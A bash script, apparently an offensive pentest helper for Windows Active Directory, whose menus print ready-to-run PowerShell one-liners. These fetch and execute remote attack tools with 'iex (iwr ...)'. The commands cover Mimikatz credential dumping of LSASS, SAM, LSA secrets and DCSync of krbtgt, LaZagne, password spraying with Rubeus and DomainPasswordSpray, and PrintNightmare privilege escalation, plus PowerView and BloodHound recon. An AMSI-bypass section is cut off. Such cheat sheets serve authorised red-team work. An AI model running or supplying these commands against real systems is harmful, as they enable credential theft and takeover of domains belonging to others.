# Test

################################################################################
# Variables                                                                    #
################################################################################

LocalIP="10.10.14.10";		#
LocalPort="8080";		#
Username="<Username>";			#
NQUsername="";			#
Password="<Password>";			#
Domain="<Domain>";			#
NQDomain="";			#
IP="<IP>";				#
NQIP="<IP>";			#
LDAP="";			#
baseLDAP="";			#
DC="";				#
NS="<IP>";			#
Version="v2.1"			#
MainCheck="1"			#


################################################################################
# Colors                                                                       #
################################################################################

RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'

adPEASRepo="https://raw.githubusercontent.com/61106960/adPEAS/main/";
BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
DomainPasswordSprayRepo="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/"
EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
PowerSharpPackRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
PowersploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
S3cur3Th1sSh1tCredsRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/";
SecListsRepo="https://github.com/danielmiessler/SecLists/";
WinPwnRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";

iwr="iex (iwr -usebasicparsing "
DownloadMethod="$iwr"



Internal_Menu_Main(){

	clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?


	1)  ->  [ Credential Access	]
	2)  ->  [ MiTM Attacks 		]
        3)  ->  [ Password Spraying 	]
        4)  ->  [ Privilege Escalation	]
        5)  ->  [ Recon 		]
        
        a)  ->	[ AMSI Bypasses		]
        
"
        read a
        case $a in
                1) 	Internal_Menu_Credential_Access ;;
        	2) 	Internal_Menu_MiTM_Attacks ;;
	        3) 	Internal_Menu_Password_Spraying ;;
	        4) 	Internal_Menu_Privilege_Escalation ;;
	        5) 	Internal_Menu_Recon ;;
	        a|A)	Internal_Menu_AMSI_Bypasses ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Credential_Access(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Credential Access Type



        1)  ->  [ Credential Dumping 			]
        2)  ->  [ Credentials from Credential Manager	]
        3)  ->  [ Credentials from Group Policy		]
        4)  ->	[ Credentials from Web Browsers		]
        5)  -> 	[ Unsecured Credentials			]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Dumping ;;
        	2) 	Internal_Menu_Credential_Access_Credential_Manager ;;
	        3) 	Internal_Menu_Credential_Access_Credential_Group_Policy ;;
	        4) 	Internal_Menu_Credential_Access_Credential_Web_Browsers ;;
	        5) 	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Credential_Access_Credential_Dumping(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Credential Dumping Type



        1)  ->  [ Cached Domain Credentials ]
        2)  ->  [ LSA Secrets		    ]
        3)  ->	[ LSASS Memory		    ]
        4)  -> 	[ NTDS			    ]
        5)  ->	[ SAM			    ]
"

        read a
        case $a in
                1) 	Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials ;;
	        2) 	Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets ;;
	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
	        5)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Cached Domain Credentials${RESTORE}"
echo -e ""
echo -e "${IBLUE}LaZagne${RESTORE}"
echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::cache"\"'"
echo -e ""
echo -e ""

}


Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}LSA Secrets${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::secrets"\"'"
echo -e ""
echo -e ""

}


Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}LSASS Memory${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
echo -e ""
echo -e "${IBLUE}Nanodump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-NanoDump.ps1);Invoke-NanoDump"
echo -e ""
echo -e "${IBLUE}SharpSecDump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
echo -e ""
echo -e ""

}


Internal_Menu_Credential_Access_Credential_Dumping_NTDS(){
	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}NTDS${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-DCSync${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:all"\"'"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:krbtgt"\"'"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::lsa /inject"\"'"
echo -e ""
echo -e ""

}


Internal_Menu_Credential_Access_Credential_Dumping_SAM(){

	clear

echo -e ""
echo -e "" 
echo -e ""      
echo -e "${LGREEN}SAM${RESTORE}"
echo -e ""
echo -e "${IBLUE}Mimikatz${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::sam"\"'"
echo -e ""
echo -e "${IBLUE}Nishang${RESTORE}"
echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
echo -e ""
echo -e "${IBLUE}SharpSecDump${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=127.0.0.1"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
echo -e ""

}


Internal_Menu_Recon(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Recon Type



        1)  ->  [ Domain Recon ]
        2)  ->  [ File and Share Recon ]
        3)  ->  [ Local Host Recon ] 
        4)  ->  [ Network Recon ]
"
        read a
        case $a in
	        1) Internal_Menu_Recon_Domain ;;
	        2) Internal_Menu_Recon_File_Share ;;
	        3) Internal_Menu_Recon_Local_Host;;
	        4) Internal_Menu_Recon_Network ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Local_Host(){

	clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Local Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}HostRecon${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
echo -e ""
echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
echo -e ""
echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
echo -e ""
echo -e "${IBLUE}JAWS${RESTORE}"
echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
echo -e ""
echo -e ""

}

Internal_Menu_Recon_Domain(){

	clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Domain Recon Type



	1)  ->	[ Domain ACL's			]
	2)  -> 	[ Domain Controllers		]
        3)  ->  [ Domain Computers and Servers 	]
        4)  ->	[ Domain Forests 		]
        5)  ->	[ Domain GPO's			]
        6)  ->	[ Domain Groups			]
        7)  -> 	[ Domain Policies 		]
        8)  ->	[ Domain Trusts 		]
        9)  ->  [ Domain Users 			]
        T)  ->  [ Tools				]
"
        read a
        case $a in
        	1) Internal_Menu_Recon_Domain_ACL ;;
        	2) Internal_Menu_Recon_Domain_Controllers ;;	
	        3) Internal_Menu_Recon_Domain_Computers_Servers ;;
	        4) Internal_Menu_Recon_Domain_Forests ;;
	        5) Internal_Menu_Recon_Domain_GPO ;;
	        6) Internal_Menu_Recon_Domain_Groups ;;
	        7) Internal_Menu_Recon_Domain_Policies ;;
	        8) Internal_Menu_Recon_Domain_Trusts ;;
	        9) Internal_Menu_Recon_Domain_Users ;;
	        t|T) Internal_Menu_Recon_Domain_Tools ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon_Domain_ACL(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain ACL's and ACE's${RESTORE}"
echo -e ""
echo -e "${IBLUE}Search for interesting ACEs${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ACLScanner -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specific AD Object${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -SamAccountName <SAM> -ResolveGUIDs"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -ADSprefix 'CN=Administrators,CN=Users' -Verbose"
echo -e ""
echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
echo -e ""
echo -e "" 

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Controllers(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Controller Enumeration${RESTORE}"
echo -e ""  
echo -e "${IBLUE}PowerView${RESTORE}" 
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainController"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomain | Select-Object 'PdcRoleOwner'"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Domain_Computers_Servers(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Computers and Servers${RESTORE}"
echo -e ""
echo -e "${IBLUE}All Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname | Sort Name "
echo -e ""
echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Ping"
echo -e ""
echo -e "${IBLUE}Computers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10*'| Select Name,dnshostname,operatingsystem,operatingsystemversion "
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 7*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"  
echo -e ""
echo -e "${IBLUE}Servers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows Server*' | Select Name,dnshostname,operatingsystem,operatingsystemversion"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Forests(){

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Forests${RESTORE}"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get details about current Forest"
echo -e ""
echo -e "${IBLUE}Get all Domains in current Forest${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain"
echo -e ""
echo -e "${IBLUE}Get global catalogs in current Forest${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestCatalog"
echo -e ""
echo -e "${IBLUE}Map Forest trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestTrust"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_GPO() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain GPO's${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get GPO's in Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
echo -e ""
echo -e "${IBLUE}Get GPO's applied to specific OU${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSpath ((Get-NetOU '<OU-Name>' -FullData).gplink.split(';')[0] -replace '^.')"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Groups() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Groups${RESTORE}"
echo -e ""
echo -e "${IBLUE}List all Groups${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup"
echo -e ""
echo -e "${IBLUE}List all Groups with partial wilcard${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup "\"*admin*"\""
echo -e ""
echo -e "${IBLUE}Identify interesting groups on a Domain Controller${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetDomainController | Get-NetLocalGroup -Recurse"
echo -e ""
echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
echo -e ""
echo -e "${IBLUE}Get all the effective members of a group${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainGroupMember -Identity "\"Domain Admins"\" -Recurse | Select MemberName,GroupName,MemberObjectClass | Sort Name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Policies() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Policies${RESTORE}"
echo -e "" 
echo -e "${IBLUE}Password Policy${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'SystemAccess'"
echo -e ""
echo -e "${IBLUE}Kerberos Policy${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'KerberosPolicy'"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Trusts() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Trusts${RESTORE}"
echo -e "" 
echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Map all reachable Domain trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts -LDAP"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust | Select SourceDomain,TargetDomain,TrustType,TrustDirection"
echo -e ""
echo -e "${IBLUE}List external trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-ForeignUser"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Users(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Users${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get User Properties${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties SamAccountName,Description | Sort SamAccountName"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
echo -e ""
echo -e "${IBLUE}Get Specific user account${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Username '<Username>'"
echo -e ""
echo -e "${IBLUE}Search for string in User Description field${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-UserField -SearchField Description -SearchTerm 'built'"
echo -e ""
echo -e "${IBLUE}Get all users with passwords changed more than 3 years ago${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);\$Date = (Get-Date).AddYears(-3).ToFileTime(); Get-DomainUser -LDAPFilter ""\"(pwdlastset<=\$Date)"\"" -Properties samaccountname,pwdlastset"
echo -e ""
echo -e "${IBLUE}Get all users with SPN set${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Get all service accounts in "\"Domain Admins"\"${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | ?{\$_.memberof -match 'Domain Admins'} | Select SamAccountName | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Get users with SID History set${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -LDAPFilter '(sidHistory=*)'"
echo -e ""
echo -e "${IBLUE}Kerberoastable users${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select name,ServicePrincipalName | Sort Name"
echo -e ""
echo -e "${IBLUE}AS-REP Roastable users${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -PreauthNotRequired | Select Name | Sort Name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?


        1)  ->  [ Domain Recon Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Tools(){


	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}adPEAS${RESTORE}"
echo -e "$DownloadMethod "$adPEASRepo"adPEAS.ps1);Invoke-adPEAS"
echo -e "$DownloadMethod "$adPEASRepo"adPEAS-Light.ps1);Invoke-adPEAS"
echo -e ""
echo -e ""
echo -e "${LGREEN}BloodHound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
echo -e ""
echo -e ""


}


Internal_Menu_Recon_Network(){

   	 clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Network Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
echo -e ""
echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 50 -Open -GrepOut Scan.txt"
echo -e ""
echo -e "${IBLUE}Invoke-Bloodhound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e ""
echo -e ""

}


Internal_Menu_Recon_File_Share() {

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}File and Share Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Share Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
echo -e ""
echo -e "${IBLUE}File Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
echo -e ""
echo -e ""

}

Internal_Menu_Privilege_Escalation() {

    clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Privilege Escalation Type



        1)  ->  [ Checks ]
        2)  ->  [ Exploits ]
"
        read a
        case $a in
	        1) Internal_Menu_Privilege_Escalation_Checks ;;
	        2) Internal_Menu_Privilege_Escalation_Exploits ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Privilege_Escalation_Checks(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Privilege Escalation (Checks)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
echo -e ""
echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e "${IBLUE}Sherlock${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
echo -e ""
echo -e "${IBLUE}PrivescCheck${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCheck"
echo -e ""
echo -e ""

}

Internal_Menu_Privilege_Escalation_Exploits(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Privilege Escalation (Exploits)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
echo -e ""
echo -e "${IBLUE}Get-System${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
echo -e ""
echo -e ""   
  
}


Internal_Menu_MiTM_Attacks(){

echo "test"



}

Internal_Menu_Password_Spraying(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Password Spraying${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-SprayEmptyPassword${RESTORE}"
echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword"
echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain Security.local -OutFile EmptyPasswordUsers.txt"
echo -e ""
echo -e "${IBLUE}Domain Password Spray${RESTORE}"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
echo -e ""
echo -e "${IBLUE}Rubeus${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /passwords:PasswordList.txt /noticket /nowrap"\""
echo -e ""
echo -e "${IBLUE}SharpSpray${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
echo -e ""
echo -e ""


}

Internal_Menu_AMSI_Bypasses(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
